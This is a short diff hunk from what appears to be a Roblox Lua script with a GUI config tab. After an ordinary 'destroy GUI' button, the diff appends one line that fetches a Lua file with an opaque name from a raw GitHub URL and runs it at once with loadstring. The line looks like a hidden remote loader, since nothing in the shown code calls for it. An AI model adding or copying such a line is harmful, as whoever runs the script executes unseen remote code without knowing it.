@@ -918,3 +918,5 @@ end)
 ConfigTab.AddButton("destroy GUI", function() ScreenGui:Destroy() end)
 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Ueuje/refs/heads/main/ac51f097d79ee647.lua.txt", true))()
+
